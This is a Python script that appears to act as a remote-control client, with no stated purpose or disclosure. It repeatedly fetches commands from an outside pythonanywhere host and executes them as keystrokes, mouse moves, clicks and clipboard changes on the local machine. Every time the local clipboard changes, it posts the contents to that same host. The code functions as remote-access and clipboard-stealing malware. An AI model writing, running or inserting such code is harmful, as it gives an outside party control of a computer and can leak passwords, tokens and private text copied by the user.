import keyboard
import time
from pynput.mouse import Controller,Button
import requests
import pyperclip
import os

try:
    mouse=Controller()

    def convert_text_to_key(input_string:str) -> list:
        if input_string.count("/copy")==1:
            return input_string
        words = input_string.split()
        result_list = []
        for word in words:
            if word[0:1] == "/":
                result_list.append(word[1:])
            else:
                result_list.extend(list(word))
        if result_list.count("+"):
            plusIndex=[]
            for index , char in enumerate(result_list):
                if char=="+":
                    plusIndex.append(index)
            newList=[]
            group_list=[]
            i=0
            for index , char in enumerate(result_list):
                if i:
                    i-=1
                    continue
                if index+1<len(result_list)-1:
                    if not result_list[index+1]=="+":
                        newList.append(char)
                    else:
                        group_list.append(char)
                        group_list.append(result_list[index+2])
                        i+=2
                        if index+3<len(result_list)-1:
                            if result_list[index+3]=="+":
                                group_list.append(result_list[index+4])
                                i+=2
                        newList.append(group_list)
                        group_list=[]
                else:
                    newList.append(char)
            return newList
        else:
            return result_list

    def pc_controll(command):
        command=convert_text_to_key(command)
        if command.count("/copy")==1:
            pyperclip.copy(command[6:])
        else:
            for char in command:
                if "exit" in char:
                    exit()

                elif "sleep" in char:
                    time.sleep(float(char[5:]))

                elif "mouse" in char:
                    mouse.position=(int(char[5:].split(",")[0]),int(char[5:].split(",")[1]))

                elif "click" in char:
                    if not int(char[5:]):
                        mouse.click(Button.left,1)    
                    else:
                        mouse.click(Button.right,1)    

                elif type(char)==str:
                    keyboard.press_and_release(char)
                    time.sleep(0.05)

                else:
                    for i in char:
                        keyboard.press(i)
                        time.sleep(0.01)
                    for i in char:
                        keyboard.release(i)
                        time.sleep(0.01)

except:
    pass

admin=False
path=os.path.dirname(os.path.abspath(__file__))
with open(f"{path}\\user.txt", "r") as file:
    user=file.read()
if user=="admin":
    user="pc1"
    admin=True
commends=[]
lastCommend=requests.get("https://mrcrow.pythonanywhere.com/getCommend").json()
commends.append(lastCommend['commend'])
clip=pyperclip.paste()

while True:
    x=requests.get("https://mrcrow.pythonanywhere.com/getCommend").json()
    if x["commend"]!="none" and (x['user']==user or x['user']=="all"):
        if x["commend"]!=commends[len(commends)-1]:
            pc_controll(x["commend"])
            commends.append(x['commend'])
    if clip!=pyperclip.paste():
        requests.post("https://mrcrow.pythonanywhere.com/sendBot",json={'text':pyperclip.paste(),"id":user})
        clip=pyperclip.paste()
        if admin:
            requests.post("https://mrcrow.pythonanywhere.com/sendCommend",json={"commend":("/copy "+pyperclip.paste()),"pc":"all"})
